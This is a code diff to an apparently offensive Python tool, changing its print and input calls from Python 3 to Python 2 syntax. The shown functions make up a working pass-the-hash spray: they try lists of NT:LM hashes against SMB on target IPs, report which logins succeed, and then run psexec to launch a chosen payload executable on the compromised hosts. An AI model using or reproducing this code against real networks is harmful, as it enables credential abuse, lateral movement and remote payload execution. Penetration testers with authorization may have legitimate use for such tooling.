@@ -32,72 +32,72 @@ t = blessed.Terminal()
 def StartPsexec(exeFile, targetusername, psexechash, targetdomain, psexecip):
     PSEXEC = psexec.PSEXEC(command="", path="", exeFile=exeFile, copyFile="", protocols=None, username=targetusername,
                            hashes=psexechash, domain=targetdomain, password='', aesKey=None, doKerberos=False)
-    print(t.bold_green + "\n[*] Starting Psexec...." + t.normal)
+    print t.bold_green + "\n[*] Starting Psexec...." + t.normal
     time.sleep(15)
     try:
         PSEXEC.run(psexecip)
     except SessionError:
-        print(t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell")
+        print t.bold_red + "[*] Clean Up Failed, Remove Manually with Shell"
 
 
 def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
     targetsprayhash = []
     targetipseperated = []
     workinghashes = []
-    print(t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile)
+    print t.bold_green + "[*] Chosen Payload: " + t.normal + exeFile
     if not hashfile:
-        targethash = input("[*] Enter Hashes Seperated by Comma: ")
+        targethash = raw_input("[*] Enter Hashes Seperated by Comma: ")
         targetsprayhash = targethash.split(",")
     else:
-        print(t.bold_green + "[*] Hash File Selected: " + t.normal + hashfile)
+        print t.bold_green + "[*] Hash File Selected: " + t.normal + hashfile
         file = open(hashfile, "r")
         for hash in file:
             targetsprayhash.append(hash.strip("\n"))
 
     if not ipfile:
-        targetips = input("[*] Enter IP's Serperated by Comma:")
+        targetips = raw_input("[*] Enter IP's Serperated by Comma:")
         targetipseperated = targetips.split(',')
     else:
-        print(t.bold_green + "[*] IP File Selected: " + t.normal + ipfile)
+        print t.bold_green + "[*] IP File Selected: " + t.normal + ipfile
         file = open(ipfile, "r")
         for ip in file:
             targetipseperated.append(ip.strip("\n"))
 
     if not username:
-        targetusername = input("[*] Enter Username: ")
+        targetusername = raw_input("[*] Enter Username: ")
     else:
         targetusername = username
     if not domain:
-        targetdomain = input("[*] Enter Domain: ")
+        targetdomain = raw_input("[*] Enter Domain: ")
     else:
         targetdomain = domain
 
     for ip in targetipseperated:
         for hash in targetsprayhash:
             targetlm, targetnt = hash.split(':')
-            print(t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip)
+            print t.green + "[*] NT:LM Hash: " + t.normal + hash.strip(' ') + "," + ip
             try:
                 with timeout(8):
                     smb = SMBConnection(ip, ip, sess_port=445)
             except Exception as E:
-                print(t.bold_red + "[!!] Timed Out!" + t.normal)
-                print(E)
+                print t.bold_red + "[!!] Timed Out!" + t.normal
+                print E
                 continue
             try:
                 smb.login(user=targetusername, password='',
                           domain=targetdomain, lmhash=targetlm, nthash=targetnt)
-                print(t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal)
+                print t.bold_green + "[!] This Hash Worked - " + smb.getServerName() + t.normal
                 workinghashes.append(hash + "," + ip)
             except Exception as E:
-                print(t.bold_red + "[!] This Hash Failed" + t.normal)
-                print(E)
+                print t.bold_red + "[!] This Hash Failed" + t.normal
+                print E
 
     if workinghashes:
-        print(t.green + "\n[*] Working Hashes:")
+        print t.green + "\n[*] Working Hashes:"
         for hash in workinghashes:
-            print(t.bold_green + hash + t.normal)
+            print t.bold_green + hash + t.normal
 
-        want_to_psexec = input("[*] Run Psexec on Working Hashes? [Y/n]: ")
+        want_to_psexec = raw_input("[*] Run Psexec on Working Hashes? [Y/n]: ")
         if want_to_psexec.lower() == "y" or want_to_psexec == "":
             for hash in workinghashes:
                 psexechash, psexecip = hash.split(",")
@@ -109,7 +109,7 @@ def DoPsexecSpray(exeFile, hashfile="", ipfile="", username="", domain=""):
                     b.daemon = True
                 b.start()
     else:
-        print(t.bold_red + "[!] No Working Hashes. Exiting..." + t.normal)
+        print t.bold_red + "[!] No Working Hashes. Exiting..." + t.normal
 
 
 if __name__ == "__main__":
